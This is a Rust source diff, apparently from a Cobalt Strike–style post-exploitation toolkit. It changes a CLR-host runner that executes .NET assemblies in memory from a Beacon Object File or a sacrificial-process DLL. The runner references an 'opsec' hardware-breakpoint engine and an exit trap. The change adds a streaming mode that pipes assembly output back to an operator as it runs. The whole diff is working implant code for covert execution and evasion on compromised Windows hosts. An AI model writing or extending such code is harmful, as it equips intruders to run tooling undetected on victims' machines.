@@ -48,8 +48,20 @@ pub struct OrchestrateInput<'a> {
     pub asm_bytes: &'a [u8],
 }
 
-/// End-to-end CLR-host runner. Used by the BOF (inline mode) and the
-/// postex DLL (sacrificial mode).
+/// Caller-supplied hook for streaming mode: receives the pipe-read HANDLE
+/// before the CLR begins writing. Caller is expected to spawn a thread
+/// that reads from this handle and forwards bytes to operator.
+///
+/// `ctx` is an opaque pointer threaded through unchanged — typically a
+/// reference to the caller's BeaconAPI struct.
+#[cfg(target_os = "windows")]
+pub type PipeReadyHook = unsafe extern "C" fn(
+    read_handle: windows_sys::Win32::Foundation::HANDLE,
+    ctx: *mut core::ffi::c_void,
+);
+
+/// Inline-mode orchestrate. Drains the pipe at end-of-run into a String
+/// and prints once via `rustbof::eprintln`. Used by the BOF.
 ///
 /// # Safety
 ///
@@ -78,6 +90,35 @@ pub unsafe fn orchestrate(
     input: &OrchestrateInput<'_>,
     engine: &opsec_hwbp::HwbpEngine,
 ) -> Result<(), OrchestratorError> {
+    unsafe { orchestrate_internal(input, engine, None, core::ptr::null_mut()) }
+}
+
+/// Sacrificial-mode orchestrate. Invokes `hook(read_handle, ctx)` once,
+/// immediately after the internal pipe is opened, so the caller can spawn
+/// a reader thread before the CLR starts writing. NO end-of-run drain;
+/// the streamer drains to EOF (signalled by `IoChannel::drop` closing
+/// the write end).
+///
+/// # Safety
+/// Same as `orchestrate`. Additionally, `ctx` must outlive the call.
+/// Hook is called exactly once, before dispatch.
+#[cfg(target_os = "windows")]
+pub unsafe fn orchestrate_streaming(
+    input: &OrchestrateInput<'_>,
+    engine: &opsec_hwbp::HwbpEngine,
+    hook: PipeReadyHook,
+    ctx: *mut core::ffi::c_void,
+) -> Result<(), OrchestratorError> {
+    unsafe { orchestrate_internal(input, engine, Some(hook), ctx) }
+}
+
+#[cfg(target_os = "windows")]
+unsafe fn orchestrate_internal(
+    input: &OrchestrateInput<'_>,
+    engine: &opsec_hwbp::HwbpEngine,
+    hook: Option<PipeReadyHook>,
+    ctx: *mut core::ffi::c_void,
+) -> Result<(), OrchestratorError> {
     unsafe {
         // PE parser → runtime detection (single-file mode only; multi-file
         // mode trusts the caller-bundled blob).
@@ -96,6 +137,13 @@ pub unsafe fn orchestrate(
 
         // Open the output channel BEFORE the CLR initializes stdio.
         let mut io_ch = io::IoChannel::open(input.mailslot, input.slot_name, input.pipe_name)?;
+
+        // Streaming mode: hand the read handle to the caller, exactly once,
+        // before the CLR starts writing.
+        let streaming = hook.is_some();
+        if let Some(h) = hook {
+            h(io_ch.read_handle(), ctx);
+        }
 
         // Capture the cleanup point for the exit-trap (re-entry after
         // Environment.Exit). The trap is installed below before dispatch.
@@ -135,18 +183,27 @@ pub unsafe fn orchestrate(
             // Path A: assembly Main returned normally.
             #[cfg(feature = "debug-io")]
             io_ch.diag_write(b"\n[RUST_END]\n");
-            if let Ok(output) = io_ch.drain() {
-                if !output.is_empty() {
-                    rustbof::eprintln!("\n{}", output);
+            // Inline mode: drain the pipe and emit via BeaconOutput.
+            // Streaming mode: the caller's reader thread is already
+            // draining; we just let `io_ch.drop` close the write end at
+            // function exit so the streamer observes ERROR_BROKEN_PIPE.
+            if !streaming {
+                if let Ok(output) = io_ch.drain() {
+                    if !output.is_empty() {
+                        rustbof::eprintln!("\n{}", output);
+                    }
                 }
             }
             dispatch_result?;
         }
         // Trailing drain — covers path B (no-op for path A, which already
-        // drained).
-        if let Ok(output) = io_ch.drain() {
-            if !output.is_empty() {
-                rustbof::eprintln!("\n{}", output);
+        // drained). Streaming mode skips entirely; the reader thread sees
+        // EOF when this function returns and `io_ch` is dropped.
+        if !streaming {
+            if let Ok(output) = io_ch.drain() {
+                if !output.is_empty() {
+                    rustbof::eprintln!("\n{}", output);
+                }
             }
         }
         Ok(())
